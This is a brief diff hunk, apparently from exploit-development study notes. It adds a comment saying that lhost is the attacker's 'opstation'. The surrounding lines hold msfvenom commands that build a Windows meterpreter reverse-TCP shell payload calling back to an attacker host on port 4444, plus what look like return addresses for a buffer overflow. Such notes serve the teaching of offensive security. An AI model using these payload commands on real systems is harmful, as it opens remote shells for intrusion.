@@ -382,6 +382,7 @@ msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.22.235 lport=4444 -b "\x
 	625011AF
 	625011BB
 	msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.X.X lport=4444 -b "\x00" -f python
+ 	lhost = linux opstation, or whatever host is used to as the attack platform for operation. 
 	'''
 	
 	
